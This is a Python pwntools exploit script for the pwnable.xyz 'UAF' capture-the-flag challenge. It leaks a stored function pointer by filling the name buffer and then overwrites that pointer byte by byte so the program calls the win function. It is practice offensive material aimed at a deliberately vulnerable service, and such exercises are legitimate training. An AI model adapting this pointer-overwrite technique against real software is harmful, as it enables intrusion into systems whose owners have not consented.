from pwn import *


# Pwnable.xyz UAF challenge
# 100 points
# svc.pwnable.xyz : 30015 

context(arch="amd64", kernel="amd64")
"""
Menu:
	1. Play
	2. Save game.
	3. Delete save
	4. Print name.
	5. Change char.
	0. Exit.
"""


def menu(proc, choose):
	proc.recvuntil(b"> ")
	proc.sendline(str(choose).encode("utf-8"))

def change_char(proc, later, now):
	menu(proc, 5)
	proc.recvuntil(b": ")
	proc.sendline(later)
	proc.recvuntil(b": ")
	proc.sendline(now)

def print_name(proc):
	menu(proc, 4)
	proc.recvuntil(b": ")
	result = proc.recvuntil(b"\nMenu")
	return result[:-5]

def main():
	e = ELF("challenge")
	# p = process("./challenge")
	# gdb.attach(p)
	# p = process(["strace", "-o", "strace.out", "./challenge"])
	p = remote("svc.pwnable.xyz", 30015)

	win_addr = e.symbols["win"]
	calc_addr = e.symbols["calc"]


	# Init
	p.recvuntil(b": ")
	p.send(b"A"*0x7F) # My name

	# Now fill name until it connects with calc address
	change_char(p, b"K", b"A")
	cur_name = print_name(p)
	cur_len = len(cur_name) - cur_name.count(b"K")

	while(cur_len < 0x88):
		change_char(p, b"K", b"A")
		cur_len += 1

	part_calc_addr = print_name(p)
	print(part_calc_addr[0x80:])
	print(pack(calc_addr))
	print(pack(win_addr))

	for i in range(len(pack(calc_addr))-1, -1, -1):
		later = pack(calc_addr)[i]
		new = pack(win_addr)[i]
		if later == new:
			continue
		print("Change %d to %d" % (later, new))
		change_char(p, pack(later, 8), pack(new, 8))

	print("Sended")
	menu(p, 1)
	print("Menu")
	print(p.recvline())
	print(p.recvuntil(b"\nMenu")[:-5])
	print(print_name(p))




main()